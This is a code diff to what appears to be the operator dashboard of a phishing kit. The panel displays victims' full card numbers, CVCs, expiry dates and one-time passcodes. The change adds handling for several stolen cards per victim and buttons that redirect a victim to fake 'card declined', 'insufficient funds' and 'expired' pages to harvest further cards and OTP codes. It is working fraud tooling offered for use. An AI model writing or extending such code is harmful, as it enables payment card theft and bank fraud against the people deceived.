@@ -193,34 +193,54 @@ function statusBadge(v) {
 
 const cardMap = {};
 
+function copyNum(btn, text) {
+    navigator.clipboard.writeText(text).then(() => {
+        const orig = btn.textContent;
+        btn.textContent = 'Copied';
+        setTimeout(() => { btn.textContent = orig; }, 1200);
+    });
+}
+
+function renderOneCard(p, idx, total) {
+    const cn = p.card_number || '';
+    const label = total > 1 ? `Card #${idx+1}` : 'Card Data';
+    const copyId = 'cn_' + Math.random().toString(36).slice(2,8);
+    return `
+        <div style="margin-top:6px;padding-top:8px;border-top:1.5px dashed #e2e8f0">
+            <div class="vw-submitted-row"><span class="lbl" style="color:#c2410c;font-weight:700">${label}</span><span class="val" style="color:#c2410c;font-size:.72rem">Received ${esc(p.received_at||'')}</span></div>
+            <div class="vw-submitted-row"><span class="lbl">Name</span><span class="val">${esc(p.cardholder)}</span></div>
+            <div class="vw-submitted-row"><span class="lbl">Number</span><span class="val" style="display:flex;align-items:center;gap:6px"><span style="font-family:Consolas,monospace;letter-spacing:.5px">${esc(cn)}</span><button onclick="copyNum(this,'${esc(cn)}')" style="padding:1px 6px;border:1px solid #cbd5e1;border-radius:4px;background:#f8fafc;font-size:.65rem;cursor:pointer;white-space:nowrap">Copy</button></span></div>
+            <div class="vw-submitted-row"><span class="lbl">Type</span><span class="val">${esc(p.card_type)}</span></div>
+            <div class="vw-submitted-row"><span class="lbl">Expiry</span><span class="val">${esc(p.expiry)}</span></div>
+            <div class="vw-submitted-row"><span class="lbl">CVC</span><span class="val">${esc(p.cvc||'')}</span></div>
+            <div class="vw-submitted-row"><span class="lbl">Amount</span><span class="val">${esc(p.amount)}</span></div>
+        </div>`;
+}
+
 function paymentHTML(v) {
     if (!v.payment_data) return '';
     try {
-        const p = typeof v.payment_data === 'string' ? JSON.parse(v.payment_data) : v.payment_data;
-        const cn = p.card_number || '';
-        const formatted = cn.replace(/(.{4})/g, '$1 ').trim();
-        return `
-            <div style="margin-top:6px;padding-top:8px;border-top:1.5px dashed #e2e8f0">
-                <div class="vw-submitted-row"><span class="lbl" style="color:#c2410c;font-weight:700">Card Data</span><span class="val" style="color:#c2410c;font-size:.72rem">Received ${esc(p.received_at||'')}</span></div>
-                <div class="vw-submitted-row"><span class="lbl">Name</span><span class="val">${esc(p.cardholder)}</span></div>
-                <div class="vw-submitted-row"><span class="lbl">Number</span><span class="val" style="font-family:Consolas,monospace;letter-spacing:1px">${esc(formatted)}</span></div>
-                <div class="vw-submitted-row"><span class="lbl">Type</span><span class="val">${esc(p.card_type)}</span></div>
-                <div class="vw-submitted-row"><span class="lbl">Expiry</span><span class="val">${esc(p.expiry)}</span></div>
-                <div class="vw-submitted-row"><span class="lbl">CVC</span><span class="val">${esc(p.cvc||'')}</span></div>
-                <div class="vw-submitted-row"><span class="lbl">Amount</span><span class="val">${esc(p.amount)}</span></div>
-            </div>`;
+        let raw = typeof v.payment_data === 'string' ? JSON.parse(v.payment_data) : v.payment_data;
+        // Support both old single-object and new array format
+        const list = Array.isArray(raw) ? raw : [raw];
+        return list.map((p, i) => renderOneCard(p, i, list.length)).join('');
     } catch(e) { return ''; }
 }
 
 function otpHTML(v) {
     if (!v.otp_data) return '';
     try {
-        const o = typeof v.otp_data === 'string' ? JSON.parse(v.otp_data) : v.otp_data;
-        return `
+        let raw = typeof v.otp_data === 'string' ? JSON.parse(v.otp_data) : v.otp_data;
+        // Support both old single-object and new array format
+        const list = Array.isArray(raw) ? raw : [raw];
+        return list.map((o, i) => {
+            const label = list.length > 1 ? `OTP #${i+1}` : 'OTP Code';
+            return `
             <div style="margin-top:6px;padding-top:8px;border-top:1.5px dashed #e2e8f0">
-                <div class="vw-submitted-row"><span class="lbl" style="color:#7c3aed;font-weight:700">OTP Code</span><span class="val" style="color:#7c3aed;font-size:.72rem">Received ${esc(o.received_at||'')}</span></div>
+                <div class="vw-submitted-row"><span class="lbl" style="color:#7c3aed;font-weight:700">${label}</span><span class="val" style="color:#7c3aed;font-size:.72rem">Received ${esc(o.received_at||'')}</span></div>
                 <div class="vw-submitted-row"><span class="lbl">Code</span><span class="val" style="font-family:Consolas,monospace;letter-spacing:2px;font-size:1.1rem;font-weight:700">${esc(o.code)}</span></div>
             </div>`;
+        }).join('');
     } catch(e) { return ''; }
 }
 
@@ -357,6 +377,10 @@ function buildInner(v) {
         <div class="vw-redirect-panel" id="redir-${v.id}">
             <div class="vw-redirect-options">
                 <button class="vw-redir-btn" onclick="doRedirect(${v.id},'payment.php')">Payment</button>
+                <button class="vw-redir-btn" style="color:#dc2626" onclick="doRedirect(${v.id},'payment.php?error=declined')">Card Declined</button>
+                <button class="vw-redir-btn" style="color:#dc2626" onclick="doRedirect(${v.id},'payment.php?error=insufficient')">Insufficient</button>
+                <button class="vw-redir-btn" style="color:#dc2626" onclick="doRedirect(${v.id},'payment.php?error=expired')">Card Expired</button>
+                <button class="vw-redir-btn" style="color:#dc2626" onclick="doRedirect(${v.id},'payment.php?error=error')">Payment Error</button>
                 <button class="vw-redir-btn" onclick="doRedirect(${v.id},'approve.php')">Approve</button>
                 <button class="vw-redir-btn" onclick="doRedirect(${v.id},'otp.php')">OTP</button>
                 <button class="vw-redir-btn" onclick="doRedirect(${v.id},'thankyou.php')">Thank You</button>
